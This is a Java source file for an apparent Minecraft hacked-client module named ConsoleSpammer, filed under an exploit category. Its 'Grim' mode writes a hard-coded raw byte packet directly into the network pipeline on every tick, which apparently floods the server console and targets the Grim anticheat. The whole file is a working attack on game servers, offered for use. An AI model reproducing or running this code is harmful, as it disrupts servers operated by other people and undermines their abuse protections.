package me.coolmint.ngm.features.modules.exploit;

import com.google.common.eventbus.Subscribe;
import io.netty.buffer.Unpooled;
import me.coolmint.ngm.event.impl.GameLeftEvent;
import me.coolmint.ngm.features.modules.Module;
import me.coolmint.ngm.features.settings.Setting;

public class ConsoleSpammer extends Module {
    public Setting<modes> mode = register(new Setting<>("Mode", modes.Grim));
    public Setting<Boolean> autoDisable = register(new Setting<>("AutoDisable", true));

    private enum modes{
        Grim
    }

    public ConsoleSpammer() {
        super("ConsoleSpammer", "", Category.EXPLOIT, true, false, false);
    }

    byte[] data = {7, 0, -49, -24, 11, 6, 0, 0};

    @Override
    public void onUpdate(){
        mc.player.networkHandler.connection.channel.pipeline().firstContext().writeAndFlush(Unpooled.wrappedBuffer(data));
    }

    @Subscribe
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.getValue()) toggle();
    }
}